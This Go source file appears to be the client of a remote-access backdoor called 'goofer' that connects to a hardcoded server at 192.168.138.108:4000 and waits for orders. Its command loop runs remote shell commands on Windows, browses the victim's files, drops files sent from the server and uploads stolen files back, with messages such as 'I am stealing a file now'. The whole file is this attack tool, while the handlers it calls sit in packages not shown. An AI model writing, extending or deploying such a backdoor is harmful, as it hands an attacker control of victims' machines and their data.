package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strings"

	executecmd "github.com/toastsandwich/goofer/core/executeCmd"
	"github.com/toastsandwich/goofer/core/handlers"
	"github.com/toastsandwich/goofer/core/navigator"
	"github.com/toastsandwich/goofer/core/reciever"
	"github.com/toastsandwich/goofer/core/sender"
)

func main() {
	var conn net.Conn
	serverIp := "192.168.138.108"
	serverPrt := "4000"
	conn, err := handlers.DialToServer(serverIp, serverPrt)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	fmt.Println("[+] Connection established with " + conn.RemoteAddr().String())

	reader := bufio.NewReader(conn)
	loop := true
	for loop {
		cmdRaw, err := reader.ReadString('\n')
		if err != nil {
			log.Fatal(err)
		}
		cmd := strings.TrimSuffix(cmdRaw, "\n")
		switch {
		case cmd == "1":
			fmt.Println("[+] I am in control now ...")
			err = executecmd.ExecuteCommandsOnWindows(conn)
			if err != nil {
				log.Fatal(err)
			}
		case cmd == "2":
			fmt.Println("[+] Don't mind just looking through your wokspace ...")
			err = navigator.NavigatorWindows(conn)
			if err != nil {
				log.Fatal(err)
			}
		case cmd == "3":
			fmt.Println("[+] Just a gift from me ...")
			err = reciever.TakeFileFromServer(conn)
			if err != nil {
				log.Fatal(err)
			}
		case cmd == "4":
			fmt.Println("[+] I am stealing a file now ...")
			err = sender.UploadFileToServer(conn)
			if err != nil {
				log.Fatal(err)
			}
		case cmd == "99":
			fmt.Println("[+] Check for damage.")
			loop = false
		default:
			fmt.Println("[-] Enter valid command.")
		}
	}
}
